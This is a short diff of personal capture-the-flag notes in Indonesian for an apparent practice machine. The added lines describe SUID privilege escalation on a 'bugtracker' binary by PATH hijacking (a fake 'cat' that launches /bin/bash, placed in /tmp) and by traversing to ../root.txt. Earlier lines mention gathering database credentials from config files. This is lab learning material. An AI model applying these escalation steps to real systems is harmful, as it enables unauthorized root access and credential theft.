@@ -6,7 +6,11 @@
 6. dapet shell tuh  -> explore /opt /home user dulu -> ada flag user klaim aja
 7. ke /var/www/html biasanya ada config.php gada ke cdn-cgi login -> ada db.php catat creds
 
-pe: 
+pe (Path hijacking on executable SUID) : 
 1. cek di find / -type f -perm -u=s sih ada bugtracker -> coba jalanin masukin angka gede nanti gada cat
-2. echo '/bin/bash' > cat -> cat cat -> export PATH=/tmp:$PATH -> echo $PATH -> ke tmp -> bugtracker
-3. nanti masukin ../root.txt -> klaim root
+2. ini di /tmp ->  echo '/bin/bash' > cat -> cat cat -> export PATH=/tmp:$PATH -> echo $PATH -> ke tmp -> bugtracker
+3. klaim root
+
+pe2: 
+1. jalanin aja /usr/bin/bugtracker -> nanti masukin 5 misal -> kan ada dir nya tuh 
+2. arahin aja ../root.txt dapet flag 
